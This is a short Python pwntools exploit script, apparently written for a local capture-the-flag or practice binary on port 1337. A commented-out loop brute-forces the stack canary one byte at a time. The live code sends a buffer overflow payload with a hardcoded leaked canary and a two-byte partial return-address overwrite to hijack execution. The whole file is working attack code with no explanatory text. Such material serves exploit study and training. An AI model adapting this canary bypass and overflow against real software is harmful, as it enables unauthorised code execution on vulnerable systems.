from pwn import *

canary_from_input_buf = 120
current_payload_size = 121

bruteforced_canary = p64(0x72c24863b2379000)
"""
while(len(bruteforced_canary) <= 8):
	for i in range(0x00, 0xff+1):
		p = remote("localhost", 1337)
		p.sendline(bytes(str(current_payload_size), 'ascii'))

		byte = int.to_bytes(i)
		payload = b""
		payload += b"A" * 120
		payload += (bruteforced_canary + byte)

		p.send(payload)

		res = p.recvall()

		p.close()

		if(b"stack smashing") not in res:
			print("------------- FOUND -------------")
			print("[+] Found a byte :: {}".format(byte))
			bruteforced_canary += byte
			current_payload_size += 1
			print("[+] Canary Till Now :: {}".format(bruteforced_canary))
			print()
			continue
		else:
			print("[!] Trying byte {}".format(byte))
			print("[+] Canary Till Now :: {}".format(bruteforced_canary))

"""
print("[+] Leaked Canary :: {}".format(bruteforced_canary[0:8]))
print("[+] Initiating Final Payload")

final_payload = b""
final_payload += b"A" * 120
final_payload += bruteforced_canary[0:8]
final_payload += b"A" * 8
final_payload += b"\x86\x10"

p = remote("127.0.0.1", 1337)
p.sendline(b"138")

p.send(final_payload)

print(p.recvall())